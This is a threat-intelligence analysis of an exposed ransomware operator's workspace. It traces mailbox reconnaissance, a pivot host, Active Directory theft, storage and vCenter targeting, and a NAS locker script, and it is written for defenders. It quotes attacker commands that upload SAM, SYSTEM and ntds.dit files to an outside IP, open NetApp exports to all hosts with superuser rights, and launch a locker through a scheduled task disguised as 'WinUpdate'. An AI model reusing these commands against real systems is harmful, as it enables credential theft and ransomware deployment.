# Overview

The most revealing artifact in this capture was not the ransomware binary. It was the workflow around it.

An exposed operator directory tied together stolen cloud access, a live VPN session, a Windows pivot host, confirmed Active Directory database theft, storage-management targeting, and a scripted NAS encryption path. Taken together, the files show a post-compromise operator workspace moving from documentation and credentials to domain theft and then toward storage impact. The evidence is strongest for preparation, targeting, and control-plane abuse; it is weaker for final ransomware execution.

That distinction matters. Plenty of ransomware reporting jumps straight to the payload. This capture shows the machinery that makes the payload useful.

## The Story the Evidence Actually Supports

The cleanest evidence-backed sequence looks like this:

1. Compromised Microsoft 365 access was used to mine mail and OneDrive for infrastructure knowledge.
2. A Windows host at `10.86.56.16` became the operator’s main bridge into the internal environment.
3. Active Directory hives and `ntds.dit` were exfiltrated to attacker infrastructure on July 14, 2026.
4. The same pivot was then used to tunnel into storage and virtualization management paths.
5. NetApp, OceanStor, Veeam, vCenter, and SMB-backed NAS shares were all pulled into the same workflow.
6. A Windows locker was staged against named NAS shares, while cross-platform Linux and ESXi payloads sat ready in a nested archive.

Every stage in that chain is supported by source artifacts. Not every stage is supported equally. That is where this capture gets interesting.

# The Mailbox Came First

The operator did not start with encryption. They started with context.

The Graph scripts are not generic mailbox scrapers. They search for device inventories, network changes, public IP moves, VPN details, jump-box guides, and VMware exports. In other words, they use the victim’s own collaboration data as an administrative map.

Evidence: `grab2.py:6-103`, `check_latest_it.py:63-93`, `download_vmware_archive.py:35-103`

One short excerpt captures the intent:

```python
data = urllib.parse.urlencode({
    "grant_type": "password",
    "client_id": "[REDACTED]",
    "scope": "https://graph.microsoft.com/.default",
    "username": "[REDACTED]",
    "password": "[REDACTED]",
}).encode()

url = "https://graph.microsoft.com/v1.0/me/drive/root/search(q='devices%20accounts')"
url = "https://graph.microsoft.com/v1.0/me/drive/root/search(q='Jbox')"
```

This is a small point with large consequences. A mailbox full of mundane IT correspondence becomes a routing table, a password hint list, and a field guide to the management plane.

Another script searched recent mail for `FortiGate`, `network circuit`, `public IP`, `ISP`, and `VPN` terms. That is not curiosity. That is pre-positioning.

Evidence: `check_latest_it.py:63-93`

# The Pivot Host That Tied Everything Together

The capture only becomes coherent when `10.86.56.16` enters the picture.

That host appears over and over: in WinRM sessions, in portproxy rules, in storage scripts, in NAS deployment logic, and in Veeam and VMware targeting. It is the point where cloud-derived intelligence stops being reconnaissance and starts becoming operational access.

Evidence: `push_ntds.py:3`, `tunnel_setup.py:2-12`, `netapp_fix.py:2-57`, `nas_locker.py:2-24`, `netapp_audit.py:2-69`

This is also where the story gets less abstract. The operator is no longer reading about the environment. They are using a trusted administrative host to move through it.

# The Moment the Intrusion Stops Being Debatable

Some artifacts show intent. `push_ntds.py` and `http_recv.log` show execution.

The script uploads `SAM`, `SECURITY`, `SYSTEM`, and `ntds.dit` to `213.176.114.6`. The receiver log records matching `PUT` requests on July 14, 2026, between `17:14:08` and `17:16:18` UTC. That is the strongest confirmed action in the entire dataset.

Evidence: `push_ntds.py:7-21`, `http_recv.log:1-4`

The code is blunt enough to be useful:

```powershell
Invoke-WebRequest -Uri "http://213.176.114.6:7777/SAM" -Method PUT -InFile "C:\Windows\Temp\SAM"
Invoke-WebRequest -Uri "http://213.176.114.6:7777/SECURITY" -Method PUT -InFile "C:\Windows\Temp\SECURITY"
Invoke-WebRequest -Uri "http://213.176.114.6:7777/SYSTEM" -Method PUT -InFile "C:\Windows\Temp\SYSTEM"
Invoke-WebRequest -Uri "http://213.176.114.6:7777/ntds.dit" -Method PUT -InFile "C:\Windows\Temp\ntds.dit"
```

This is the point where the operator’s workspace stops looking like a loose toolkit and starts looking like a documented intrusion path.

The surrounding scripts matter too. `ntds_extract.py` can stand up a temporary HTTP service on port `9999`, and `chunk_ntds.py` can chunk `ntds.dit` over WinRM in Base64. That redundancy suggests the actor expected friction and built multiple ways around it.

Evidence: `ntds_extract.py:7-34`, `chunk_ntds.py:6-35`

# From Theft to Control-Plane Abuse

Once the AD material leaves the network, the workflow fans out into the systems that can do the most damage with the least noise: storage, backup, and virtualization.

The operator configured Windows `portproxy` rules on the pivot and then stood up attacker-side `socat` listeners to reach internal management services indirectly. `tunnels.log` shows those listeners online on July 14, then timing out repeatedly on July 15. Something broke the path. The capture does not say what.

Evidence: `tunnel_setup.py:6-12`, `start_tunnels.sh:4-9`, `tunnels.log:1-39`

That tunnel layer matters because it turns unreachable internal management interfaces into externally reachable working surfaces. It is not flashy. It is effective.

## NetApp Was More Than a Lookup Target

The NetApp scripts do not stop at enumeration. One of them attempts to add `0.0.0.0/0` rules with read, write, and `superuser` access across export policies. Another comments openly about the next step: mount the exports on ESXi and run the locker.

Evidence: `netapp_fix.py:38-57`, `netapp_open.py:4-48`

The key excerpt is short and ugly in exactly the right way:

```powershell
$rule = '{"clients":[{"match":"0.0.0.0/0"}],"ro_rule":["any"],"rw_rule":["any"],"superuser":["any"]}'
$result = NetApi "POST" "/protocols/nfs/export-policies/$($p.id)/rules" $rule
```

This is one of the clearest examples in the capture of an operator trying to make storage easier to reach before impact. What the evidence does **not** prove is that the rule was accepted. The capture preserves the attempt logic, not the successful configuration change.

## VMware Was the Second Pressure Point

The VMware scripts show the same pattern: move from visibility into control.

`vc_perms.py` attempts to grant the compromised domain account the built-in vCenter administrator role, create a CIS session, query the appliance `root` account, reset that password, and enable SSH and shell access. `vc_snap_reset.py` then tries to snapshot the vCenter VM so its disk can be manipulated more directly.

Evidence: `vc_perms.py:18-72`, `vc_snap_reset.py:30-39`

Those are meaningful escalation attempts. They are not proof of successful vCenter takeover. That line matters, especially in public reporting.

# The NAS Playbook Is the Real Reveal

If one file explains what the operator was trying to achieve, it is `nas_locker.py`.

The script maps five named SMB shares on `10.31.8.15`, writes `C:\Windows\Temp\go.bat`, creates a scheduled task called `WinUpdate`, launches `locker.exe --mode fast --dir` against each mapped drive, and then checks whether `locker.exe` is running.

Evidence: `nas_locker.py:7-24`

A condensed excerpt is enough:

```powershell
net use K: \\10.31.8.15\K /user:[REDACTED] [REDACTED]
net use N: \\10.31.8.15\NXP-DATA /user:[REDACTED] [REDACTED]

C:\Windows\Temp\locker.exe --mode fast --dir K:\
C:\Windows\Temp\locker.exe --mode fast --dir N:\

schtasks /create /tn WinUpdate /tr C:\Windows\Temp\go.bat /sc once /st 00:00 /ru SYSTEM /f
schtasks /run /tn WinUpdate
```

This is the best artifact in the capture because it binds together the credential reuse, the pivot host, the share targets, the execution wrapper, and the intended impact.

It is also the artifact most likely to be overstated in a rush to publish. The capture proves **prepared** or **attempted** NAS deployment logic. It does **not** prove completed encryption of those shares. `nas_check.py` shows the operator coming back to check `locker.exe` and remap the shares, which strengthens the case that the NAS path was operationally important, but it still stops short of proving end-state impact.

Evidence: `nas_check.py:1-20`

# The Payload Archive Matters, But Less Than People Think

The nested `vsilicon.zip` archive contains 14 platform-specific binaries, including Windows, Linux, and ESXi builds timestamped `2026-07-14 12:54`. Static strings from the Windows and ESXi/Linux samples align strongly with INC ransomware, including `INC-README.txt`, shadow-copy deletion strings, and ESXi-specific snapshot and VM power-off references.

Evidence: `vsilicon.zip` listing, `l.exe` extracted strings at `0x1c3ce7`, `0x1c3de8`, `0x1c4a88`; `x86_64-unknown-linux-esxi` extracted strings at `0xa927f`, `0xa9732`, `0xab49d`

That makes the family alignment a strong assessment. It does **not** make operator attribution a settled fact. The archive supports “INC-aligned payload set” comfortably. It does not, on its own, prove a specific affiliate identity.

# What We Can Prove, and What We Cannot

The capture supports a tight story if it stays inside its own evidence.

We can prove:

- targeted Microsoft 365 collection against infrastructure-relevant material
- a successful GlobalProtect session
- repeated WinRM use of a Windows pivot host
- successful exfiltration of `SAM`, `SECURITY`, `SYSTEM`, and `ntds.dit`
- internal tunneling toward storage and management interfaces
- explicit NetApp access-broadening attempts
- attempted vCenter administrative abuse
- prepared or attempted NAS-focused locker deployment
- a staged cross-platform INC-aligned payload set

We cannot prove:

- the initial access vector
- successful NetApp export-policy modification
- successful vCenter permission change or appliance password reset
- successful NAS encryption
- execution of the Linux or ESXi binaries
- operator affiliation beyond malware-family alignment

That is not a weakness in the analysis. It is the difference between evidence and enthusiasm.

# Why This Matters

The usual ransomware story starts too late. It starts at encryption, at the ransom note, or at the incident summary after the operator has already done the interesting work.

This capture shows the quieter part: a crew using stolen cloud access to learn the environment, a trusted Windows system to bridge into the core, and management-plane tooling to turn privilege into reach. The ransomware binary is almost the least surprising part of the operation.

For defenders, the lesson is blunt. The dangerous step was not just payload delivery. It was the convergence of:

- mailbox intelligence collection
- privileged remote administration
- AD database theft
- internal forwarding to management services
- storage access manipulation

Break any one of those links early enough and the ending changes.

# Conclusion

The exposed workspace did not capture a single dramatic detonation. It captured something more useful: the operator’s working method.

That method moved from mailbox to map, from map to pivot, from pivot to domain theft, and from domain theft to the systems most likely to magnify impact. The evidence is strongest where many public writeups are weakest: in the connective tissue between access and impact.

If there is a headline lesson here, it is not that ransomware actors target NAS devices. Everyone already knows they do. The lesson is how methodically they use ordinary enterprise data and ordinary admin surfaces to get there.
